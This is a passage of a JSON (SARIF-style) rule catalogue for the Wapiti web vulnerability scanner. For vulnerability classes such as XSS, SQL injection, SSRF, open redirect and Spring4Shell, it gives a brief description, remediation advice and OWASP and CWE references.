                    "text": "OWASP: Code Injection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-11"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-open-redirect",
              "name": "Open Redirect",
              "fullDescription": {
                "text": "Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials."
              },
              "properties": {
                "solution": "Force all redirects to first go through a page notifying users that they are going off of your site, and have them click a link to confirm.",
                "references": [
                  {
                    "uri": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
                    "text": "Unvalidated Redirects and Forwards Cheat Sheet"
                  },
                  {
                    "uri": "https://www.acunetix.com/blog/web-security-zone/what-are-open-redirects/",
                    "text": "Acunetix: What Are Open Redirects?"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/601.html",
                    "text": "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect",
                    "text": "OWASP: Client-side URL Redirect"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "601"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CLNT-04"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-reflected-cross-site-scripting",
              "name": "Reflected Cross Site Scripting",
              "fullDescription": {
                "text": "Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts."
              },
              "properties": {
                "solution": "The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding: <, >, &, ', (, ), #, %, ; , +, -",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/attacks/xss/",
                    "text": "OWASP: Cross Site Scripting (XSS)"
                  },
                  {
                    "uri": "https://en.wikipedia.org/wiki/Cross-site_scripting",
                    "text": "Wikipedia: Cross-site scripting"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/79.html",
                    "text": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting",
                    "text": "OWASP: Reflected Cross Site Scripting"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "79"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-01"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-secure-flag-cookie",
              "name": "Secure Flag cookie",
              "fullDescription": {
                "text": "The secure flag is an option that can be set by the application server when sending a new cookie to the user within an HTTP Response. The purpose of the secure flag is to prevent cookies from being observed by unauthorized parties due to the transmission of a the cookie in clear text."
              },
              "properties": {
                "solution": "When generating the cookie, make sure to set the Secure Flag to True.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html",
                    "text": "OWASP: Testing for Cookies Attributes"
                  },
                  {
                    "uri": "https://owasp.org/www-community/controls/SecureCookieAttribute",
                    "text": "OWASP: Secure Cookie Attribute"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-SESS-02"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-spring4shell",
              "name": "Spring4Shell",
              "fullDescription": {
                "text": "A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment.If the application is deployed as a Spring Boot executable jar, i.e. the default,it is not vulnerable to the exploit. However, the nature of the vulnerability is more general,and there may be other ways to exploit it."
              },
              "properties": {
                "solution": "Users of affected versions should apply the following mitigation: 5.3.x users should upgrade to 5.3.18+,5.2.x users should upgrade to 5.2.20+. No other steps are necessary.There are other mitigation steps for applications that cannot upgrade to the above versions.",
                "references": [
                  {
                    "uri": "https://cyberwatch.fr/cve/spring4shell-tout-savoir-sur-la-vulnerabilite-0-day-liee-a-java-spring/",
                    "text": "CYBERWATCH: Spring4Shell CVE-2022-22965"
                  },
                  {
                    "uri": "https://tanzu.vmware.com/security/cve-2022-22965",
                    "text": "VMWARE: CVE-2022-22965 Detail"
                  },
                  {
                    "uri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965",
                    "text": "MITRE: CVE-2022-22965"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection",
                    "text": "OWASP: Code Injection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-11"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-sql-injection",
              "name": "SQL Injection",
              "fullDescription": {
                "text": "SQL injection vulnerabilities allow an attacker to alter the queries executed on the backend database. An attacker may then be able to extract or modify information stored in the database or even escalate his privileges on the system. Blind SQL injection is a technique that exploits a vulnerability occurring in the database of an application. This kind of vulnerability is harder to detect than basic SQL injections because no error message will be displayed on the webpage."
              },
              "properties": {
                "solution": "To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
                    "text": "OWASP: SQL Injection"
                  },
                  {
                    "uri": "https://en.wikipedia.org/wiki/SQL_injection",
                    "text": "Wikipedia: SQL injection"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/89.html",
                    "text": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
                  },
                  {
                    "uri": "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                    "text": "OWASP: Blind SQL Injection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "89"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-05"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-tls/ssl-misconfigurations",
              "name": "TLS/SSL misconfigurations",
              "fullDescription": {
                "text": "The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. Over the years numerous vulnerabilities have been discovered in some SSL/TLS version or specific ciphers making the integrity of the communications at risk (eavesdropping, alteration...)"
              },
              "properties": {
                "solution": "To protect against SSL/TLS vulnerabilities, make sure that deprecated versions of the protocol are disabled. Refer to up-to-date recommendations to only allow modern versions of TLS with Perfect Forward Secrecy.",
                "references": [
                  {
                    "uri": "https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices",
                    "text": "SSL Labs: SSL and TLS Deployment Best Practices"
                  },
                  {
                    "uri": "https://wiki.mozilla.org/Security/Server_Side_TLS",
                    "text": "Mozilla: Server Side TLS recommended configurations"
                  },
                  {
                    "uri": "https://beaglesecurity.com/blog/article/importance-of-tls-1-3-ssl-and-tls-vulnerabilities.html",
                    "text": "Beagle Security: Importance of TLS 1.3, SSL and TLS Vulnerabilities"
                  },
                  {
                    "uri": "https://ciphersuite.info/",
                    "text": "Security of TLS cipher suites"
                  },
                  {
                    "uri": "https://blog.trailofbits.com/2019/03/25/what-application-developers-need-to-know-about-tls-early-data-0rtt/",
                    "text": "Trail of Bits: What Application Developers Need To Know About TLS Early Data (0RTT)"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers_Insufficient_Transport_Layer_Protection",
                    "text": "OWASP: Weak SSL TLS Ciphers Insufficient Transport Layer Protection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CRYP-01"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-server-side-request-forgery",
              "name": "Server Side Request Forgery",
              "fullDescription": {
                "text": "The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with."
              },
              "properties": {
                "solution": "Every URI received by the web application should be checked, especially scheme and hostname. A whitelist should be used.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                    "text": "OWASP: Server Side Request Forgery"
                  },
                  {
                    "uri": "https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/",
                    "text": "Acunetix: What is Server Side Request Forgery (SSRF)?"
                  },
                  {
                    "uri": "https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/",
                    "text": "What is the Server Side Request Forgery Vulnerability & How to Prevent It?"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/918.html",
                    "text": "CWE-918: Server-Side Request Forgery (SSRF)"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery",
                    "text": "OWASP: Server-Side Request Forgery"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "918"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-19"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-stored-html-injection",
              "name": "Stored HTML Injection",
              "fullDescription": {
                "text": "HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can allow the attacker to modify the page content seen by the victims."
              },
              "properties": {
                "solution": "Avoid Raw HTML Rendering: Whenever possible, avoid directly rendering user-generated content as raw HTML. Instead, use built-in templating systems or libraries that automatically escape user input by default, such as Django's template engine or AngularJS's ng-bind directive. With PHP you can use the htmlspecialchars() function to convert special characters to their corresponding HTML entities.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/03-Testing_for_HTML_Injection",
                    "text": "OWASP: Testing for HTML Injection"
                  },
                  {
                    "uri": "https://www.imperva.com/learn/application-security/html-injection/",
                    "text": "IMPERVA: HTML Injection"
                  },
                  {
                    "uri": "https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection",
                    "text": "HackTricks: Dangling Markup - HTML scriptless injection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CLNT-03"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-stored-cross-site-scripting",
              "name": "Stored Cross Site Scripting",
              "fullDescription": {
                "text": "Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts."
              },
              "properties": {
                "solution": "The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding: <, >, &, ', (, ), #, %, ; , +, -",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/attacks/xss/",
                    "text": "OWASP: Cross Site Scripting (XSS)"
                  },
                  {
                    "uri": "https://en.wikipedia.org/wiki/Cross-site_scripting",
                    "text": "Wikipedia: Cross-site scripting"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/79.html",
                    "text": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting",
                    "text": "OWASP: Stored Cross Site Scripting"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "79"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-02"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-subdomain-takeover",
              "name": "Subdomain takeover",
              "fullDescription": {
                "text": "A DNS CNAME record points to a non existing domain or to a content that an attacker can take control of."
              },
              "properties": {
                "solution": "Prevent dangling DNS entries by making sure you already have control over the pointed domain.",
                "references": [
                  {
                    "uri": "https://docs.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover",
                    "text": "Microsoft: Prevent dangling DNS entries and avoid subdomain takeover"
                  },
                  {
                    "uri": "https://github.com/EdOverflow/can-i-take-over-xyz",
                    "text": "Can I take over XYZ? — a list of services and how to claim (sub)domains with dangling DNS records."
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover",
                    "text": "OWASP: Subdomain Takeover"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-10"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-blind-sql-injection",
              "name": "Blind SQL Injection",
              "fullDescription": {
                "text": "Blind SQL injection is a technique that exploits a vulnerability occurring in the database of an application. This kind of vulnerability is harder to detect than basic SQL injections because no error message will be displayed on the webpage."
              },
              "properties": {
                "solution": "To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                    "text": "OWASP: Blind SQL Injection"
                  },
                  {
                    "uri": "https://en.wikipedia.org/wiki/SQL_injection",
                    "text": "Wikipedia: SQL injection"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/89.html",
                    "text": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
                    "text": "OWASP: SQL Injection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "89"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-05"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-unrestricted-file-upload",
              "name": "Unrestricted File Upload",
              "fullDescription": {
                "text": "File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could allow an attacker to upload potentially dangerous files. This could even include server-side script files that enable remote code execution."
              },
              "properties": {
                "solution": "Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (../). Rename uploaded files to avoid collisions that may cause existing files to be overwritten. Do not upload files to the server's permanent filesystem until they have been fully validated.",
                "references": [
                  {
                    "uri": "https://book.hacktricks.xyz/pentesting-web/file-upload",
                    "text": "HackTricks: File Upload"
                  },
                  {
                    "uri": "https://portswigger.net/web-security/file-upload",
                    "text": "PortSwigger : File upload vulnerabilities"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/434.html",
                    "text": "CWE-434: Unrestricted Upload of File with Dangerous Type"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types",
                    "text": "OWASP: Test Upload of Unexpected File Types"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "434"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-BUSL-08"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-vulnerable-software",
              "name": "Vulnerable software",
              "fullDescription": {
                "text": "The detected software in its installed version is known to be vulnerable to one or more vulnerabilities."
              },
              "properties": {
                "solution": "Update the software to its latest version or applied security patches.",
                "references": []
              },
              "relationships": []
            },
            {
              "id": "wapiti-internal-server-error",
              "name": "Internal Server Error",
              "fullDescription": {
                "text": "An error occurred on the server's side, preventing it to process the request. It may be the sign of a vulnerability."
              },
              "properties": {
                "solution": "More information about the error should be found in the server logs.",
                "references": [
                  {
                    "uri": "https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#5xx_Server_Error",
                    "text": "Wikipedia: List of 5xx HTTP status codes"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling",
                    "text": "OWASP: Improper Error Handling"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-ERRH-01"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-resource-consumption",
              "name": "Resource consumption",
              "fullDescription": {
                "text": "It took an abnormal time to the server to respond to a query. An attacker might leverage this kind of weakness to overload the server."
              },
              "properties": {
                "solution": "The involved script is maybe using the server resources (CPU, memory, network, file access...) in a non-efficient way.",
                "references": [
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/405.html",
                    "text": "CWE-405: Asymmetric Resource Consumption (Amplification)"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/400.html",
                    "text": "CWE-400: Uncontrolled Resource Consumption"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling",
                    "text": "OWASP: Improper Error Handling"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "405"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "400"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-ERRH-01"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-review-webserver-metafiles-for-information-leakage",
              "name": "Review Webserver Metafiles for Information Leakage",
              "fullDescription": {
                "text": "Test various metadata files for information leakage of the web application’s path(s), or functionality"
              },
              "properties": {
                "solution": "This is only for informational purposes.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage",
                    "text": "OWASP: Review Webserver Metafiles for Information Leakage"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INFO-03"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-fingerprint-web-technology",
              "name": "Fingerprint web technology",
              "fullDescription": {
                "text": "The use of a web technology can be deducted due to the presence of its specific fingerprints."
              },
              "properties": {
                "solution": "This is only for informational purposes.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.html",
                    "text": "OWASP: Fingerprint Web Server"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html",
                    "text": "OWASP: Fingerprint Web Application Framework"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INFO-02"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INFO-08"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-http-methods",
              "name": "HTTP Methods",
              "fullDescription": {
                "text": "While GET and POST are by far the most common methods that are used to access information provided by a web server, HTTP allows several other (and somewhat less known) methods. Some of these can be used for nefarious purposes if the web server is misconfigured."
              },
              "properties": {
                "solution": "This is only for informational purposes.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
                    "text": "OWASP: HTTP Methods"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-06"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-general-finding",
              "name": "Wapiti General Finding",
              "fullDescription": {
                "text": "A general vulnerability or anomaly reported by Wapiti, or one without a specific classification in the report."
              }
            }
          ]
        }
      }
    }
  ]
}